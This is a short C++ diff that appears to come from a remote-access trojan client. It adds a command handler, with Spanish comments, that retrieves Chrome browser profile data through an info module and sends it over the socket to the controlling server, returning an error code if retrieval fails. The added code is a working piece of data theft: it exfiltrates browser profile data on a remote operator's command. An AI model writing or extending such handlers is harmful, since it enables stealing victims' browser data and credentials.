@@ -854,7 +854,17 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         if (this->mod_Inf0 == nullptr) {
             this->mod_Inf0 = new mod_Info();
         }
-
+        strIn = strSplit(paquete.cBuffer.data(), CMD_DEL, 2);
+        if (strIn.size() == 2) {
+            _DBG_(strIn[0], strIn[1]);
+            std::string strPaquete = this->mod_Inf0->m_GetProfileData(strIn[0], strIn[1][0]);
+            if (strPaquete.size() > 2) {
+                this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::INF_Chrome_Profile_Data_Out);
+            }else {
+                this->cChunkSend(this->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, nullptr, EnumComandos::INF_Error);
+                __DBG_("No se pudo obtener informacion del perfil");
+            }
+        }
         return;
     }
 }
